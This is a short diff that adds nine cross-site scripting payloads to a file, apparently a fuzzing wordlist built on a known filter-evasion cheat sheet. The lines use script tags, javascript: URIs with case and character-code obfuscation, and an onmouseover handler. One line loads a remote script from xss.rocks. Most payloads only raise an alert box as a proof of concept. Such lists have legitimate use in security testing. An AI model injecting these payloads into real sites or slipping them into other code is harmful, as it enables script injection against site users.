@@ -1,0 +1,9 @@
+<script>alert(1)</script>
+<IMG SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+""><SCRIPT>alert("XSS")</SCRIPT>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
